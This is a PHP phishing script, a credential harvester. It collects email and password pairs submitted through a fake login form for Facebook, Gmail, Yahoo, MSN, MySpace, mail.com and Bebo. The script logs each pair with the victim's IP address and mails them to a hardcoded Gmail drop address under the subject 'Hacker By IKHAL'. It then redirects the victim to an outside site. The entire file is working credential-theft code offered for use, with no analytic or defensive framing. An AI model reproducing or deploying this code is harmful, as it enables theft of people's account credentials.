<?php
$to="khaldewantara@gmail.com";
$ip=$_SERVER['REMOTE_ADDR'];
$echo= "==================================";
$kambing=$_POST[email];
$akml =$_POST[password];
$kambing2=$_POST[email2];
$akml2 =$_POST[password2];
$kambing3=$_POST[email3];
$akml3 =$_POST[password3];
$kambing4=$_POST[email4];
$akml4 =$_POST[password4];
$kambing5=$_POST[email5];
$akml5 =$_POST[password5];
$kambing6=$_POST[email6];
$akml6 =$_POST[password6];
$kambing7=$_POST[email7];
$akml7 =$_POST[password7];
$akml8 =$_POST[password];
$today = date("F j, Y,");
$time = date(" g:i a");
$fl = "";
$handle = fopen($file, 'a'); 
fwrite($handle, "===========================[$today]================================");
fwrite($handle, "<br />");
fwrite($handle, "\n\n");
fwrite($handle, "facebook :");
fwrite($handle, "<br />");
fwrite($handle, "Email: ");
fwrite($handle, "$kambing");
fwrite($handle, "\n");
fwrite($handle, "<br />");
fwrite($handle, "Password: ");
fwrite($handle, "$akml \n\n");
fwrite($handle, "\n");
fwrite($handle, "<br />");

fwrite($handle, "gmail");
fwrite($handle, "\n");
fwrite($handle, "<br />");
fwrite($handle, "Email: ");
fwrite($handle, "$kambing2");
fwrite($handle, "\n");
fwrite($handle, "<br />");
fwrite($handle, "Password: ");
fwrite($handle, "$akml2\n\n");
fwrite($handle, "\n");
fwrite($handle, "<br />");

fwrite($handle, "yahoo");
fwrite($handle, "<br />");
fwrite($handle, "\n");
fwrite($handle, "Email: ");
fwrite($handle, "$kambing3");
fwrite($handle, "\n");
fwrite($handle, "<br />");
fwrite($handle, "Password: ");
fwrite($handle, "$akml3\n\n");
fwrite($handle, "\n");
fwrite($handle, "<br />");

fwrite($handle, "msn");
fwrite($handle, "\n");
fwrite($handle, "<br />");
fwrite($handle, "Email: ");
fwrite($handle, "$kambing4");
fwrite($handle, "\n");
fwrite($handle, "<br />");
fwrite($handle, "password: ");
fwrite($handle, "$akml4\n\n");
fwrite($handle, "\n");
fwrite($handle, "<br />");

fwrite($handle, "My_space");
fwrite($handle, "<br />");
fwrite($handle, "\n");
fwrite($handle, "Email: ");
fwrite($handle, "$kambing5");
fwrite($handle, "\n");
fwrite($handle, "<br />");
fwrite($handle, "password: ");
fwrite($handle, "$akml5\n\n");
fwrite($handle, "\n");
fwrite($handle, "<br />");

fwrite($handle, "mail.com");
fwrite($handle, "<br />");
fwrite($handle, "\n");
fwrite($handle, "Email: ");
fwrite($handle, "$kambing6");
fwrite($handle, "\n");
fwrite($handle, "<br />");
fwrite($handle, "Password: ");
fwrite($handle, "$akml6\n\n");
fwrite($handle, "\n");
fwrite($handle, "<br />");

fwrite($handle, "bebo");
fwrite($handle, "<br />");
fwrite($handle, "\n");
fwrite($handle, "Email: ");
fwrite($handle, "$kambing7");
fwrite($handle, "\n");
fwrite($handle, "<br />");
fwrite($handle, "password: ");
fwrite($handle, "$akml7\n\n");
fwrite($handle, "\n");
fwrite($handle, "<br />");

fwrite($handle, "IP Address: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "\n");
fwrite($handle, "<br />");
fwrite($handle, "================================================================");
fwrite($handle, "<br />");
fclose($handle);
$title = "IKHAL Hacker Link";
$sub="Hacker By IKHAL";
$header = "From: ITAKORESO\r\n";
$header .= "Mudah-mudahan Banyak Cip.X";

$mes .= "ip: ".$ip."\n";
$mes .= "====[FACEBOOK]=========";
$mes .= ": ".$kambing."\n";
$mes .= "=======================";
$mes .= ": ".$akml."\n";
$mes .= "===================================================";
$mes .= ": ".$akml8."\n";
$mes .= "====[GMAIL]============";
$mes .= ": ".$kambing2."\n";
$mes .= "=======================";
$mes .= ": ".$akml2."\n";
$mes .= "===================================================";
$mes .= ": ".$akml8."\n";
$mes .= "====[YAHOO]============";
$mes .= ": ".$kambing3."\n";
$mes .= "=======================";
$mes .= ": ".$akml3."\n";
$mes .= "===================================================";
$mes .= ": ".$akml8."\n";
$mes .= "====[MSN]==============";
$mes .= ": ".$kambing4."\n";
$mes .= "=======================";
$mes .= ": ".$akml4."\n";
$mes .= "===================================================";
$mes .= ": ".$akml8."\n";
$mes .= "====[MY SPACE]=========";
$mes .= ": ".$kambing5."\n";
$mes .= "=======================";
$mes .= ": ".$akml5."\n";
$mes .= "===================================================";
$mes .= ": ".$akml8."\n";
$mes .= "====[MAIL.COM]=========";
$mes .= ": ".$kambing6."\n";
$mes .= "=======================";
$mes .= ": ".$akml6."\n";
$mes .= "===================================================";
$mes .= ": ".$akml8."\n";
$mes .= "====[BEBO]=============";
$mes .= ": ".$kambing7."\n";
$mes .= "=======================";
$mes .= ": ".$akml7."\n";
$mes .= "===================================================";
$mes .= ": ".$akml8."\n";
$mes .= "====[PADA====]=========";
$mes .= ": ".$today."\n";
$mes .= "====[JAM=====]=========";
$mes .= ": ".$time."\n";
{
mail($to, $sub, $mes, $header);
}

?>


<SCRIPT LANGUAGE="JavaScript">
window.location="http://vchattercamfree.cf/";
</script> 
